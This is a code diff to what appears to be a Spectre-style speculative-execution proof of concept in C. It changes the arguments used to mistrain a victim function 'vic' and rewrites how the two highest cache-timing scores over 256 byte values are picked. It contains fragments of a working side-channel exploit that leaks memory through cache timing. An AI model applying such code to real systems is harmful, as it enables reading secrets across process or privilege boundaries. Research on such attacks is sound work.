@@ -60,21 +60,21 @@ int main(){
         }
         // for(int k = 0; k < 10; ++k)
         //     vic(((k % 9) >> 3) & 1);
-        vic(0xff, 0xc39d);
-        vic(0xff, 0xc39d);
-        vic(0xff, 0xc39d);
-        vic(0xff, 0xc39d);
-        vic(0xff, 0xc39d);
-        vic(0xff, 0xc39d);
-        vic(0xff, 0xc39d);
-        vic(0xff, 0xc39d);
-        vic(0xff, 0xc39d);
-        vic(0xff, 0xc39d);
-        vic(0xff, 0xc39d);
-        vic(0xff, 0xc39d);
+        vic(1, 0xc39d);
+        vic(1, 0xc39d);
+        vic(1, 0xc39d);
+        vic(1, 0xc39d);
+        vic(1, 0xc39d);
+        vic(1, 0xc39d);
+        vic(1, 0xc39d);
+        vic(1, 0xc39d);
+        vic(1, 0xc39d);
+        vic(1, 0xc39d);
+        vic(1, 0xc39d);
+        vic(1, 0xc39d);
         // flush(&probe_array[98 * 4096]);
         // mfence();
-        uint8_t a = vic(0xff, 0x9090);
+        uint8_t a = vic(0, 0x9090);
         // printf("%d\n", a);
         // printf("%d\n", ((try % 9) >> 3) & 1);
         for (size_t i = 0; i < 256; i++) {
@@ -88,22 +88,19 @@ int main(){
         }
     }
 
-    // find top two
-    int max = 0;
-    int idx = -1;
-    int second = 0;
-    int second_idx = -1;
+    // find top 2 max
+    int j = -1,  k = -1;
     for(int i = 0; i < 256; ++i){
-        if(results[i] > max){
-            second = max;
-            second_idx = idx;
-
-            max = results[i];
-            idx = i;
+        if(j < 0 || results[i] >= results[j]){
+            k = j;
+            j = i;
+        }
+        else if (k < 0 || results[i] >= results[k]){
+            k = i;
         }
     }
 
-    printf("idx: %2x score: %d, second_idx:%2x, second score: %d\n", idx, results[idx], second_idx, second);
+    printf("idx: %2x score: %d, second_idx:%2x, second score: %d\n", j, results[j], k, results[k]);
 
     // for(int i = 0; i < 100; ++i)
     //     printf("%d\n", ((i / 6) & 1) - 1);
